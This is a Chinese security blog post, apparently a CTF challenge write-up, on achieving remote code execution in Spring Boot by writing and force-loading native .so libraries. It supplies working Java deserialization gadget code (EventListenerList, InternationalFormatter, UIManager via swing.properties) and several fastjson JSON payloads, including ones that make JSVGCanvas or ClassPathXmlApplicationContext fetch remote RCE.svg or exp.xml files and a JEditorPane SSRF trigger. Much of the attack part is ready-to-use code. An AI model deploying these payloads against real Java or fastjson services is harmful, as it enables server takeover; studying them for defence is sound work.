#  springboot环境下的写文件RCE——so加载篇  
原创 珂字辈
                        珂字辈  珂技知识分享   2026-03-03 07:21  
  
[springboot环境下的写文件RCE](https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&mid=2247487184&idx=1&sn=834e20b19fcffcda9a3357c7621d7bcc&scene=21#wechat_redirect)  
  
  
[springboot环境下的写文件RCE——so劫持篇](https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&mid=2247488145&idx=1&sn=5b8e5d4e18b06aaa9bffe49a4963e95a&scene=21#wechat_redirect)  
  
  
  
1，如何触发加载so？  
  
  
前文介绍了很多可以劫持的so，如何触发呢？绝大部分System.loadLibrary()都写在静态代码块，只需要简单Class.forName()就行。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Be2IPichjh3MF7dJYF5zcPedNbicPShgAzYxgTrxbVxnRrwXRAjHEMliclabYA13D01NGNOO3en1YiajiaQPVn9NS6e420AnxaJFkcMWIhDOMBxM/640?wx_fmt=png&from=appmsg "")  
  
forName()第二个参数决定了是否加载静态代码块，劫持so只需要第二个参数为true就行，好消息是常用的写法基本都为true。  
```
//触发static
Class.forName("test.User");  
Class.forName("test.User", true, Thread.currentThread().getContextClassLoader());
new test.User();
Thread.currentThread().getContextClassLoader().loadClass("test.User").newInstance();
//不触发static
Class.forName("test.User", false, Thread.currentThread().getContextClassLoader());
Thread.currentThread().getContextClassLoader().loadClass("test.User");
```  
  
第三个参数是ClassLoader，它决定了从哪儿取类，对于tomcat-docbase手法比较重要，必须要用Thread.currentThread().getContextClassLoader()，单String的Class.forName("xxx")是不行的。  
  
  
所以我们的目标就是尽量找既可以so劫持，又可以tomcat-docbase类加载的触发链，常见入口是原生反序列化链和fastjson反序列化链。  
  
  
2，原生反序列化链  
  
对于原生反序列化链触发so劫持来说，是比较容易的，因为部分so的相关类，本身就实现了Serializable，最典型的就是awt/swing触发System.loadLibrary("awt")。随便一个相关类都能触发java.awt.Component的静态代码，进而Toolkit.loadLibraries()->System.loadLibrary("awt")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Be2IPichjh3NL2xAKoTJDFQJ1Co2WxcAXe6z0Nfv8XH4vgB2RAxdqHiag9Wh5JVQvqcaUibGicP1HhekIicBMeUPpMiadIpjShXVV9wpaIewVbCM4/640?wx_fmt=png&from=appmsg "")  
  
那么问题来了Class本身也实现了Serializable，我直接反序列化Class行不行呢？还真不行，可以看到第二个参数刚好为false。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Be2IPichjh3P8QjqNkStKBjy86KnTjWnBlzKFqER7WOOR0AfPkovYYtpJZCknLppiaouOyN3fIUC47ILtZMRVicxynicDiaxokiayGwMTMcgLEicTM/640?wx_fmt=png&from=appmsg "")  
  
  
所以需要找一些可以触发任意类加载甚至实例化的链，很容易从传统反序列化链中找到。比如c3p0链。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Be2IPichjh3NvXiaYkG5LgHZp3tRLUYv8icqrtWVJeERmoY0CHhib1HhtvYFibciarIZqgWPpD6v8jYaA14ZUAO0icPTskOZ0DZmymCBH4Xtp4SZKI/640?wx_fmt=png&from=appmsg "")  
  
以及getter+jdbc中的DriverClassName实例化，例子为jackson+DruidXADataSource  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Be2IPichjh3OAeRIxqX37POzic2IILAAibXxj3XHe3PHDO78iaX0ZicryUg04ic8X2ZDmRLRvhoU3icOXUyKPvNPCzyocicn0ePNHBNxMnq5Rr0mvdc/640?wx_fmt=png&from=appmsg "")  
  
当然，这些主流链自己就能RCE了，还费这劲搞什么劫持so，我们需要找到一些纯粹的  
ClassForName链或者  
newInstance链。  
  
3，EventListenerList(推荐)  
  
作为新的toString()链常客，很早就注意到它的readObject()可以触发Class.forName()了。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Be2IPichjh3OxsmfBaZxPaqS0XFDVQWUl14NhvKStibhxLse3Aic1ctHmEVyNvhiaH6rt4kvuGX5WicibG609guib4hP1eBEhb6VQB3xiaedrqiciaHYg/640?wx_fmt=png&from=appmsg "")  
  
```
    String classname = "Tomcat678910cmdecho";
    Class clazz = null;
    try {
        clazz = Class.forName(classname);
    } catch (Exception e) {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass(classname);
        clazz = ctClass.toClass();
    }
    
    EventListenerList eventListenerList = new EventListenerList();
    UndoManager undoManager = new UndoManager();
    Reflections.setFieldValue(eventListenerList, "listenerList", new Object[]{clazz, undoManager});

    ObjectOutputStream oos2 = new ObjectOutputStream(new FileOutputStream("1.ser"));
    oos2.writeObject(eventListenerList);
    ObjectInputStream ois = new ObjectInputStream(new FileInputStream("1.ser"));
    ois.readObject();
```  
  
  
4，InternationalFormatter(推荐)  
  
[遗憾的InternationalFormatter反序列化链](https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&mid=2247488091&idx=1&sn=cfaab21869913eb9a314918397fcae9f&scene=21#wechat_redirect)  
  
  
这个链作为RCE不完整，可以实例化任意类，传入的单String参数却不受控制。这不刚好是一个完美的  
newInstance链吗？没想到吧，这篇文章就已经有伏笔了。  
  
当然，这些都是超冷门项目，这种刻舟求剑的东西似乎除了CTF没什么实际意义(真的如此吗？)。  
```
        Class clazz = ClassPathXmlApplicationContext.class;
        String arg = "http://127.0.0.1:5667/exp.xml";

        InternationalFormatter internationalFormatter = new InternationalFormatter();
        DefaultFormatter defaultFormatter = new DefaultFormatter();
        JFormattedTextField jFormattedTextField = new JFormattedTextField(defaultFormatter);
        jFormattedTextField.setValue(arg);
        
        MessageFormat format = new MessageFormat("{0}");
        internationalFormatter.setFormat(format);
        
        Reflections.setFieldValue(internationalFormatter, "ftf", jFormattedTextField);
        Reflections.setFieldValue(internationalFormatter, "allowsInvalid", false);
        Reflections.setFieldValue(internationalFormatter, "valueClass", clazz);
        
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("1.ser"));
        oos.writeObject(internationalFormatter);
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("1.ser"));
        ois.readObject();
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Be2IPichjh3PBVy4ib0UVWKQDJO0T61Hjw83ZrWCgHfnfrC1fZOIGYKQYLN0SliaTGmibKiajSWQQd0OFTOTWaaHSv0EIpnrBU3RVJTEX0sCDfYs/640?wx_fmt=png&from=appmsg "")  
  
5，UIManager  
  
codeql找一下看还有没有其他的  
```
class ReadObject extends Sink{
    ReadObject(){
        this.hasName("readObject") and 
        this.isPrivate() and 
        this.getReturnType() instanceof VoidType
        
    }
}

class ClassLoader extends Source {
    ClassLoader() {
        this.hasName("getContextClassLoader")
    }
}

class NewInstance extends Source {
    NewInstance() {
        this.getACallee().hasName("newInstance")
    }
}

MethodAccess seekSink(Method sourceMethod){
    exists(
        MethodAccess ma, Method method|
        (ma.getEnclosingStmt() = sourceMethod.getBody().getAChild*() and
        method = ma.getMethod()) |
        if method instanceof ClassLoader
        then result = ma
        else result = seekSink(method)
    )
}

from ReadObject sink
select sink.getDeclaringType(),sink, seekSink(sink)
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Be2IPichjh3Nn4du8icV3vpsUrow91969JNPZia1ryZmoWU0Rc93YIBF0DcsU7U9xaw1E0B875eOq2ZhNFJK1RtkA57LkQ41v7GdfOr30h4YuU/640?wx_fmt=png&from=appmsg "")  
  
EventListenerList已经说过了，swing相关类JLabel/JLayer/JMenuItem肯定可以触发awt so加载，还能触发任意类加载吗？看看调用栈。  
```
UIManager.initializeAuxiliaryLAFs(Properties) line: 1421 
UIManager.initialize() line: 1518 
UIManager.maybeInitialize() line: 1483 
UIManager.getUI(JComponent) line: 1056 
JMenuItem.updateUI() line: 243 
JMenuItem.readObject(ObjectInputStream) line: 759 
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Be2IPichjh3NEdHNm6JX9nsRkJkGfjVu7WiciaaN6P1KVYzQtTrUQ0gsHicOod1ZiaX7qicQiaP89AiaMRRUR78VCeicCpUibxlrcJCpCQaiblLv5rYSZg/640?wx_fmt=png&from=appmsg "")  
  
className是从swingProps取出来的，swingProps怎么来的，往前导导。  
```
UIManager.makeSwingPropertiesFilename() line: 290 
UIManager$1.run() line: 1291 
AccessController.doPrivileged(PrivilegedAction<T>) line: not available [native method] 
UIManager.loadSwingProperties() line: 1282 
UIManager.initialize() line: 1515 
UIManager.maybeInitialize() line: 1483 
UIManager.getUI(JComponent) line: 1056 
JMenuItem.updateUI() line: 243 
JMenuItem.readObject(ObjectInputStream) line: 759 
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Be2IPichjh3M2N9Uc1xLBamuV3TbOLLktias95DJSQWZVTTvFXJDYUqcI6zh4KoKMrqJznqMQWzaMIUPBqqz35tUhp8aqQNicweCp86D11NXfk/640?wx_fmt=png&from=appmsg "")  
  
取java.home/conf/swing.properties，key为swing.auxiliarylaf(同理swing.defaultlaf也可以)。测试一下。  
  
/usr/lib/jvm/java-11-openjdk-amd64/conf/swing.properties  
  
写入内容  
  
swing.auxiliarylaf=Tomcat678910cmdecho  
  
同样需要root权限，效果如下。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Be2IPichjh3Nzgo7Sts1XrDLFkYRd4H0JhQ6VJibYVGk5VR5BiaNof6kiaU9Lc2sUWr2NNO9CUkibufCwRiaKdY10ZrNJLN4UicNyhzLE9l0V0twLo/640?wx_fmt=png&from=appmsg "")  
  
但由于是UIManager初始化触发，所以只能触发一次，第二次过不去这里的校验。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Be2IPichjh3OaX1DoGCW9ooFsiceSIKfJDa43ib8DZibkVTX80sibldxMNYtTluiapoeKF1PJrlF0WOf4iabHPYSA39IWibPUwQGt5guicgyUlmpl83s/640?wx_fmt=png&from=appmsg "")  
  
  
  
6，  
ProgressMonitorInputStream  
  
JLabel/JLayer/JMenuItem反序列化时能触发  
updateUI()，实例化时一样也能触发啊，那么fastjson反序列化能够利用这条  
UIManager链吗？还真可以。  
  
我找到一个关键类  
javax.swing.ProgressMonitorInputStream，它可以期望  
java.awt.Component。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Be2IPichjh3P3OnI3ibEBVzRk2aXL61Q8LFWkkaJwAGCweAJbbt80DeoBE4PeibO44CLf1yvhOPxnsGuELibiba3oRDly4L7a65EdUnzXCTEEyy0/640?wx_fmt=png&from=appmsg "")  
  
Component为awt核心类，是很多swing组件的父类，比如JLabel/JLayer/JMenuItem。  
  
但fastjson为了防new JEditorPane().setPage()这个SSRF的setter链，拉黑了javax.swing.J  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Be2IPichjh3M9RBwAgksAEjicHN0ZmAp1nTRVzAHD2ZvqvjqQvphPSMUDuTfCXEeunhDql33gKJ0Jk7LIqX712gcrJqd7IDcLO78uMPp8cGibI/640?wx_fmt=png&from=appmsg "")  
  
但没关系，在jdk11中，有相当多的非  
javax.swing.J开头的子类。  
  
比如触发awt so加载。  
```
{
 "@type": "java.lang.AutoCloseable",
 "@type": "javax.swing.ProgressMonitorInputStream",
 "parentComponent": {
  "@type": "java.awt.Button"
 }
}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Be2IPichjh3OhPKmICVMZKGHOMNTwvLmZicMu5P7QuPnkeUYbvl4AQl9rvyjI6sbiawML3S0BLibUpAFKsj777pEZictk6icIfkgfQ6icbExNeN4aw/640?wx_fmt=png&from=appmsg "")  
  
触发  
JEditorPane SSRF  
```
{
  "@type": "java.io.InputStream",
  "@type": "javax.swing.ProgressMonitorInputStream",
  "parentComponent": {
    "@type": "sun.tools.jconsole.HTMLPane",
    "page": "http://127.0.0.1:5667"
  },
}
```  
  
触发  
UIManager，要加载的类写在  
swing.properties中  
```
{
"@type": "java.io.InputStream",
"@type": "javax.swing.ProgressMonitorInputStream",
"parentComponent": {"@type": "javax.swing.colorchooser.DefaultPreviewPanel"}
}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Be2IPichjh3OwrHJfdL7UHwzFicMHS7KQfXZ0fq8McichwMEDKCLN9fP4dSGEGoGhVpvDbjtPeM8VZxqLqIAS8wpZRsjKBicZtoDIIVKucejMww/640?wx_fmt=png&from=appmsg "")  
  
  
当然，老生常谈，由于jdk8编译符号的问题，这个fastjson链仅jdk11才能使用。  
  
  
7，JLabel(推荐)  
  
虽然  
UIManager  
已经可以触发任意类加载了，但仅一次触发，还要多写一个文件也太不优雅了。有没有办法可以无限次数触发类加载呢？不知道大家还记不记得当年的  
CobaltStrike反制漏洞(  
CVE-2022-39197  
)。  
  
[CVE-2022-39197分析](https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&mid=2247485917&idx=1&sn=2dcf4a521e649a199ec6adb3d0397eed&scene=21#wechat_redirect)  
  
  
它本质上和  
JEditorPane一样是个setter触发的SSRF链，和fastjson非常适配，同样找个子类代替就行。  
```
{
"@type": "java.io.InputStream",
"@type": "javax.swing.ProgressMonitorInputStream",
"parentComponent": {
        "@type": "javax.swing.DefaultListCellRenderer", 
        "text": "<html><img src=http://127.0.0.1:81/1.jpg></html>"
        }
}
```  
  
在  
CobaltStrike反制漏洞中，利用了svg远程加载jar实现RCE，  
JLabel链同样可以。  
```
{
"@type": "java.io.InputStream",
"@type": "javax.swing.ProgressMonitorInputStream",
"parentComponent": {
        "@type": "javax.swing.DefaultListCellRenderer", 
        "text": "<html><object classid='org.apache.batik.swing.JSVGCanvas'><param name='URI' value='http://127.0.0.1:81/RCE.svg'></object></html>"
        }
}
```  
  
当然，也可以不用  
JLabel过渡，直接  
JSVGCanvas.setURI()  
```
{
"@type": "java.io.InputStream",
"@type": "javax.swing.ProgressMonitorInputStream",
"parentComponent": {
        "@type": "org.apache.batik.swing.JSVGCanvas", 
        "URI": "http://127.0.0.1:81/RCE.svg"
        }
}
```  
  
漏洞核心原理是，JLabel的object标签可以触发任意类实例化的，只不过需要是  
Component子类才能调setter。但我们不需要调setter啊，能够加载或者实例化类就行了。  
```
{
"@type": "java.io.InputStream",
"@type": "javax.swing.ProgressMonitorInputStream",
"parentComponent": {
        "@type": "javax.swing.DefaultListCellRenderer", 
        "text": "<html><object classid='sun.awt.image.JPEGImageDecoder'></object></html>"
        }
}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Be2IPichjh3OI8m9JCnMBRK9jcP3Hp2eicSwvr0e73YicibFUa5y1Qk0mbpxLoYugvvjDxpmuicZ9XMhAPxGd17M7Rh9Yd33jomqFmu6cFicxumdU/640?wx_fmt=png&from=appmsg "")  
  
  
  
8，结尾  
  
  
  
当然，除了任意类加载触发so之外，在jdk11中还有很多很多链可以触发特定so。  
so劫持篇就介绍了dns/awt白名单两种办法，其他人也陆陆续续发现了一些。  
  
至此，fastjson写文件挑战2想让大家学习的就差不多结束了。最后肯定还有人想要知道加固版本的预期解是什么。  
  
其实就是找jdk中可以加载的so，在linux系统中并不存在。因此不需要覆盖so，只需要向usr_paths写入一个so，比如/lib/lible.so，再用  
JLabel链触发就行。  
  
这样的类目前找到两个，我找到的是。  
  
jdk.internal.jline.WindowsTerminal  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Be2IPichjh3M5OwCQA689kV0jEJ2wuPoiaIicib4pibxT1JTPFsJx4tLSA8PAz88N6pw8emiaDgibUmQGiczoruBLdhtu2F4TfQia1Un40CCUpe2hqU0/640?wx_fmt=png&from=appmsg "")  
  
su18找到的是  
  
sun.security.jgss.wrapper.SunNativeProvider  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Be2IPichjh3Nkbg9KfR1BcBrBdpicrQQwApd0bv7qn54dX2zxJZnmwFXibKfhSuu8bFdazdHBsY9yC7cLiaQ23gcABQAHFQtjW5ibpebWjQMo5rc/640?wx_fmt=png&from=appmsg "")  
  
  
那么  
fastjson写文件挑战2就完美结束了，远程环境关闭，大家可以自行搭建docker在本地上玩。  
  
下一次【ssti挑战】正在筹备中。  
  
